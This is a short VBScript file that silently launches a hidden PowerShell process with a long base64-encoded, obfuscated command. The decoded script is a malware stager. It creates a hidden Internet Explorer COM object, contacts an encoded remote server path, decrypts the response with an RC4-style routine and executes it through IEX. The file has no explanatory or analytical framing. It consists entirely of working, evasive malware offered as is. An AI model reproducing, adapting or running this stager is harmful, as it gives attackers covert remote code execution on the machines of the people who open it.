Dim objShell
Set objShell = WScript.CreateObject("WScript.Shell")
command = "powershell -noP -sta -w 1 -enc  IAAkAHMAdAA2ACAAPQAgAFsAVAB5AFAAZQBdACgAIgB7ADEAfQB7ADAAfQB7ADgAfQB7ADcAfQB7ADYAfQB7ADQAfQB7ADUAfQB7ADkAfQB7ADMAfQB7ADIAfQAiAC0ARgAgACcAWQAnACwAJwBTACcALAAnAFIAJwAsACcARwBFACcALAAnAE8AaQBOACcALAAnAFQAbQAnACwAJwAuAHMAZQByAHYAaQBDAEUAcAAnACwAJwBUACcALAAnAHMAdABlAE0ALgBuAGUAJwAsACcAYQBuAGEAJwApACAAOwAgACAAIABTAGUAdAAtAGkAVABFAE0AIAB2AGEAUgBpAEEAQgBsAEUAOgBqADAAdQBLACAAIAAoACAAWwBUAFkAUABlAF0AKAAiAHsAMgB9AHsAMAB9AHsANQB9AHsANAB9AHsAMQB9AHsAMwB9ACIALQBGACAAJwB0AEUAJwAsACcASQBOACcALAAnAHMAeQBzACcALAAnAGcAJwAsACcARAAnACwAJwBtAC4AVABFAHgAdAAuAGUAbgBjAG8AJwApACkAOwAgACAAIAAgAFMAZQB0AC0AaQB0AGUAbQAgACgAIgB2AGEAUgAiACsAIgBpACIAKwAiAEEAQgBMAGUAIgArACIAOgAwAEwATwAiACkAIAAoAFsAdAB5AFAARQBdACgAIgB7ADAAfQB7ADEAfQB7ADIAfQAiACAALQBmACcAVABlAHgAdAAuAEUAbgBjAG8AJwAsACcARABJACcALAAnAG4ARwAnACkAIAApACAAOwAgAFMAdgAgACgAIgBBACIAKwAiAGgAUQByACIAKQAgACgAWwBUAFkAcABlAF0AKAAiAHsAMAB9AHsAMQB9ACIAIAAtAEYAIAAnAGMAJwAsACcATwBuAFYAZQByAHQAJwApACAAKQA7ACAAIAAkAEsASAA1ADEARwB1ACAAPQBbAHQAeQBQAEUAXQAoACIAewA2AH0AewAyAH0AewA4AH0AewA3AH0AewAzAH0AewA1AH0AewAwAH0AewA0AH0AewAxAH0AIgAgAC0AZgAgACcAZgBMACcALAAnAHMAJwAsACcAUwBUACcALAAnAGkAJwAsACcAQQBnACcALAAnAE4AZwAnACwAJwBzAHkAJwAsACcAYgBpAG4ARAAnACwAJwBlAE0ALgBSAEUAZgBMAEUAYwB0AEkAbwBOAC4AJwApACAAOwAgACAAcwBFAFQALQBpAFQARQBNACAAIAB2AEEAUgBpAEEAQgBMAGUAOgA2AGcANAAyAEgAIAAgACgAIABbAFQAeQBQAGUAXQAoACIAewAxAH0AewAwAH0AewAyAH0AewAzAH0AIgAtAGYAJwBvACcALAAnAHMAWQBzAFQARQBtAC4AYwAnACwAJwBOACcALAAnAHYARQByAHQAJwApACkAIAA7ACAAIABJAGYAKAAkAHsAUABgAFMAdgBlAFIAUwBJAGAAbwBgAE4AdABhAGAAQgBsAEUAfQAuACIAUABgAHMAdgBgAEUAcgBzAGkAbwBuACIALgAiAG0AYQBgAGoAbwBSACIAIAAtAGcAZQAgADMAKQB7AH0AOwAgACAAJABTAFQANgA6ADoAIgBFAFgAYABQAGUAYwBUAGAAMQAwADAAQwBPAG4AYABUAEkATgB1AEUAIgA9ADAAOwAkAHsAawB9AD0AIAAgACgAIABjAEgAaQBMAEQAaQBUAEUATQAgAFYAYQBSAGkAQQBCAEwARQA6AEoAMABVAEsAIAAgACkALgB2AEEATAB1AGUAOgA6ACIAQQBzAGAAQwBpAEkAIgAuACgAIgB7ADAAfQB7ADIAfQB7ADEAfQAiACAALQBmACcARwBlAHQAQgAnACwAJwBzACcALAAnAHkAdABlACcAKQAuAEkAbgB2AG8AawBlACgAKAAoACgAKAAiAHsAMwB9AHsAMAB9AHsANAB9AHsANwB9AHsANgB9AHsAMgB9AHsANQB9AHsAOAB9AHsAMQB9ACIAIAAtAGYAIAAnAF0AQwBMAE8AOABTACcALAAnAGoAPwAsADwANgAnACwAJwA9ACcALAAnAFAAJwAsACcAbgAxACgATQAnACwAJwAtAEIAJgB7ADAAfQBEAGMAJwAsACcAbwBlACcALAAnACsAVQAyAHgALgAnACwAJwA6AHYAJwApACkALQBGACAAIABbAEMASABhAHIAXQAxADIANAApACkAKQA7ACQAewBSAH0APQB7ACQAewBkAH0ALAAkAHsAawB9AD0AJAB7AEEAcgBgAGcAUwB9ADsAJAB7AHMAfQA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAuACgAJwAlACcAKQB7ACQAewBqAH0APQAoACQAewBKAH0AKwAkAHsAUwB9AFsAJAB7AF8AfQBdACsAJAB7AGsAfQBbACQAewBfAH0AJQAkAHsAawB9AC4AIgBjAG8AYABVAE4AVAAiAF0AKQAlADIANQA2ADsAJAB7AHMAfQBbACQAewBfAH0AXQAsACQAewBTAH0AWwAkAHsASgB9AF0APQAkAHsAcwB9AFsAJAB7AEoAfQBdACwAJAB7AHMAfQBbACQAewBfAH0AXQB9ADsAJAB7AEQAfQB8AC4AKAAnACUAJwApAHsAJAB7AEkAfQA9ACgAJAB7AGkAfQArADEAKQAlADIANQA2ADsAJAB7AEgAfQA9ACgAJAB7AGgAfQArACQAewBTAH0AWwAkAHsAaQB9AF0AKQAlADIANQA2ADsAJAB7AHMAfQBbACQAewBJAH0AXQAsACQAewBzAH0AWwAkAHsAaAB9AF0APQAkAHsAUwB9AFsAJAB7AGgAfQBdACwAJAB7AFMAfQBbACQAewBpAH0AXQA7ACQAewBfAH0ALQBiAHgAbwByACQAewBzAH0AWwAoACQAewBTAH0AWwAkAHsASQB9AF0AKwAkAHsAUwB9AFsAJAB7AEgAfQBdACkAJQAyADUANgBdAH0AfQA7ACQAewBpAGUAfQA9AC4AKAAiAHsAMwB9AHsAMQB9AHsAMgB9AHsAMAB9ACIAIAAtAGYAJwBiAGoAZQBjAHQAJwAsACcAZQB3ACcALAAnAC0ATwAnACwAJwBOACcAKQAgAC0AQwBPAE0AIAAoACIAewAxAH0AewA1AH0AewA2AH0AewA3AH0AewAzAH0AewA0AH0AewA4AH0AewAwAH0AewAyAH0AIgAtAGYAIAAnAGUAcgAuAEEAcABwAGwAaQAnACwAJwBJAG4AJwAsACcAYwBhAHQAaQBvAG4AJwAsACcAdABFAHgAcABsACcALAAnAG8AJwAsACcAdABlACcALAAnAHIAJwAsACcAbgBlACcALAAnAHIAJwApADsAJAB7AEkARQB9AC4AIgBzAGAASQBMAGUATgBUACIAPQAkAHsAdABgAFIAVQBlAH0AOwAkAHsAaQBlAH0ALgAiAHYASQBzAGAAaQBCAEwAZQAiAD0AJAB7AGYAYQBgAEwAcwBlAH0AOwAkAHsARgBsAH0APQAxADQAOwAkAHsAcwBgAGUAUgB9AD0AJAAoACAAKABnAEUAdAAtAHYAQQBSAGkAYQBiAGwAZQAgACAAKAAiADAAIgArACIATABPACIAKQAgACkALgBWAEEAbABVAGUAOgA6ACIAVQBgAE4ASQBgAEMAbwBkAEUAIgAuACIARwBFAFQAcwBgAFQAcgBgAGkATgBHACIAKAAgACAAKAAgAEcAZQB0AC0AaQBUAGUAbQAgACgAIgB2AEEAcgBJAGEAYgBsAGUAIgArACIAOgBBAEgAUQAiACsAIgBSACIAKQAgACkALgB2AEEATABVAGUAOgA6ACgAIgB7ADEAfQB7ADMAfQB7ADAAfQB7ADQAfQB7ADIAfQAiACAALQBmACAAJwByAGkAJwAsACcARgByAG8AbQBCAGEAcwAnACwAJwBnACcALAAnAGUANgA0AFMAdAAnACwAJwBuACcAKQAuAEkAbgB2AG8AawBlACgAKAAiAHsAMwB9AHsAMgB9AHsAMQA0AH0AewA0AH0AewAxAH0AewA1AH0AewAwAH0AewAxADAAfQB7ADcAfQB7ADYAfQB7ADEANgB9AHsAOQB9AHsAMQAxAH0AewA4AH0AewAxADUAfQB7ADEAMgB9AHsAMQAzAH0AIgAtAGYAJwBBAEQAQQBBAEwAZwBBAHcAJwAsACcANgBBAEMAOAAnACwAJwAwAEEASAAnACwAJwBhAEEAQgAnACwAJwBjAEEAQQAnACwAJwBBAEwAdwBBAHgAJwAsACcARABFAEEATgBRACcALAAnAEMANABBAE0AZwBBAHUAQQAnACwAJwBNAHcAJwAsACcARAAnACwAJwBBACcALAAnAEUAQQAnACwAJwBBACcALAAnAEQAWQBBACcALAAnAFEAQQAnACwAJwBBAHoAJwAsACcAQQA2AEEAJwApACkAKQApADsAJAB7AFQAfQA9ACgAIgB7ADAAfQB7ADMAfQB7ADQAfQB7ADEAfQB7ADIAfQAiAC0AZgAgACcALwBsACcALAAnAGUAcwBzAC4AcABoACcALAAnAHAAJwAsACcAbwBnAGkAJwAsACcAbgAvAHAAcgBvAGMAJwApADsAJAB7AEMAfQA9ACgAKAAoACIAewA1AH0AewAzAH0AewAxAH0AewA2AH0AewA0AH0AewAyAH0AewA3AH0AewAwAH0AIgAgAC0AZgAnADAAJwAsACcAWQA6ACAAJwAsACcALwBHAG8AcABwAFMASgBTAEgATABIAGsAcgBxAGoASAAyADgAeABjAEMAcwBxAGsAJwAsACcAUgBBACcALAAnAEoAMABrAEUAZQAnACwAJwBDAEYALQAnACwAJwBiADcAJwAsACcAPQA3AEoAJwApACkALgAiAHIAYABFAFAAbABhAEMARQAiACgAKABbAEMAaABBAHIAXQA1ADUAKwBbAEMAaABBAHIAXQA3ADQAKwBbAEMAaABBAHIAXQA0ADgAKQAsAFsAcwB0AFIASQBuAGcAXQBbAEMAaABBAHIAXQAzADkAKQApADsAJAB7AGkAYABFAH0ALgAoACIAewAzAH0AewAwAH0AewAyAH0AewAxAH0AIgAgAC0AZgAnAHYAaQAnACwAJwAyACcALAAnAGcAYQB0AGUAJwAsACcAbgBhACcAKQAuAEkAbgB2AG8AawBlACgAJAB7AHMAYABlAFIAfQArACQAewB0AH0ALAAkAHsAZgBgAGwAfQAsADAALAAkAHsAbgBgAFUATABMAH0ALAAkAHsAYwB9ACkAOwB3AGgAaQBsAGUAKAAkAHsAaQBlAH0ALgAiAEIAYABVAHMAWQAiACkAewAmACgAIgB7ADEAfQB7ADIAfQB7ADAAfQAiAC0AZgAgACcAbABlAGUAcAAnACwAJwBTAHQAYQByACcALAAnAHQALQBTACcAKQAgAC0ATQBpAGwAbABpAHMAZQBjAG8AbgBkAHMAIAAxADAAMAB9ADsAJAB7AGgAYABUAH0AIAA9ACAAJAB7AGkARQB9AC4AIgBkAGAAbwBgAGMAdQBNAGUAbgBUACIALgAoACIAewAxAH0AewAwAH0AIgAtAGYAIAAnAHAAZQAnACwAJwBHAGUAdABUAHkAJwApAC4ASQBuAHYAbwBrAGUAKAApAC4AKAAiAHsAMgB9AHsAMQB9AHsAMAB9ACIALQBmACcAcgAnACwAJwBiAGUAJwAsACcASQBuAHYAbwBrAGUATQBlAG0AJwApAC4ASQBuAHYAbwBrAGUAKAAoACIAewAwAH0AewAxAH0AIgAgAC0AZgAnAGIAbwBkACcALAAnAHkAJwApACwAIAAgACQAawBIADUAMQBHAFUAOgA6ACIAZwBlAHQAYABQAHIAYABPAHAARQByAFQAeQAiACwAIAAkAHsAbgBVAGAAbABsAH0ALAAgACQAewBJAGUAfQAuACIAZABPAGAAQwBgAFUATQBFAG4AdAAiACwAIAAkAHsAbgB1AGAATABsAH0AKQAuACIASQBOAGAATgBFAGAAUgBgAEgAdABtAGwAIgA7AHQAcgB5ACAAewAkAHsAZABgAEEAdABBAH0APQAgACAAKABHAEUAVAAtAFYAYQByAGkAYQBCAEwAZQAgADYAZwA0ADIASAAgAC0AVgBBAEwAVQBlAG8ATgAgACAAKQA6ADoAKAAiAHsAMAB9AHsAMwB9AHsAMgB9AHsAMQB9ACIAIAAtAGYAJwBGAHIAbwAnACwAJwBuAGcAJwAsACcAUwB0AHIAaQAnACwAJwBtAEIAYQBzAGUANgA0ACcAKQAuAEkAbgB2AG8AawBlACgAJAB7AEgAYABUAH0AKQB9ACAAYwBhAHQAYwBoACAAewAkAHsATgBgAFUAbABsAH0AfQAkAHsAaQBgAFYAfQA9ACQAewBkAGAAQQBUAEEAfQBbADAALgAuADMAXQA7ACQAewBkAEEAYABUAEEAfQA9ACQAewBEAGAAQQB0AGEAfQBbADQALgAuACQAewBkAGAAQQB0AEEAfQAuACIAbABFAG4AYABnAGAAVABIACIAXQA7AC0AagBvAGkAbgBbAEMAaABhAHIAWwBdAF0AKAAmACAAJAB7AHIAfQAgACQAewBkAGEAYABUAEEAfQAgACgAJAB7AEkAYABWAH0AKwAkAHsASwB9ACkAKQB8ACYAKAAiAHsAMQB9AHsAMAB9ACIAIAAtAGYAIAAnAFgAJwAsACcASQBFACcAKQA="
objShell.Run command,0
Set objShell = Nothing
